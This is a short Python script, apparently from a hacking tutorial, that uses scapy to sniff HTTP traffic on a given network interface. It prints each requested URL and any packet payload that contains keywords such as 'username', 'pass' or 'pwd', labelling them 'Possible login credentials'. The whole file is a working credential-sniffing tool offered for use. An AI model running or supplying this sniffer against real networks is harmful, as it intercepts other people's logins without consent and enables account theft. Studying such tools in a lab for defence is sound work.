#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse

keywords = ['username','user','login','pass','password','login_id','user_id','email','id','usr','pwd']
def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to capture packets")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-]Please specify interface to capture packets")
    return options

def sniff(interface):
    #scapy.sniff(filter = "port 5000", prn = process_sniffed_packet)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in load:
                    return load
                    
                    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] url : "+url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\nPossible login credentials \n"+login_info+"\n\n")
    
options = get_argument()
sniff(options.interface)